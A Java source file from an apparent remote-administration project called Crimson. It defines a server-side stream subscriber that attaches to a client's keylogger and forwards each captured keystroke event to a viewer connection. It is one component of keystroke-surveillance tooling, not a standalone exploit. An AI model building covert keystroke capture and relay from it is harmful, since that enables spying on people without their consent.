/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.core.stream.subscriber;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.Stream.Param;
import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
import com.subterranean_security.crimson.core.stream.Stream;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.server.ServerStore;
import com.subterranean_security.crimson.server.net.Receptor;
import com.subterranean_security.crimson.sv.ClientProfile;
import com.subterranean_security.crimson.sv.keylogger.LogCallback;

public class SubscriberSlave extends Stream {

	public SubscriberSlave(Param p) {
		param = p;
		start();
	}

	public SubscriberSlave(SubscriberParam sp) {
		this(Param.newBuilder().setSubscriberParam(sp).setStreamID(IDGen.getStreamid()).setVID(Common.cvid).build());
	}

	@Override
	public void received(Message m) {
		// do nothing
	}

	@Override
	public void send() {
		// do nothing
	}

	@Override
	public void start() {

		if (param.getSubscriberParam().getKeylog()) {
			ClientProfile cp = ServerStore.Profiles.getClient(param.getCID());

			if (cp == null) {
				System.out.println("CP IS NULL");
			}

			cp.getKeylog().addCallback(new LogCallback(this));
		}

	}

	@Override
	public void stop() {
		// TODO remove callbacks

	}

	public void trigger(EV_KEvent k) {
		Receptor r = ServerStore.Connections.getConnection(param.getVID());
		if (r == null) {
			// stop this stream
			StreamStore.removeStream(getStreamID());
			return;
		}
		r.handle.write(Message.newBuilder().setUrgent(true).setSid(param.getCID()).setEvKevent(k).build());

	}

}
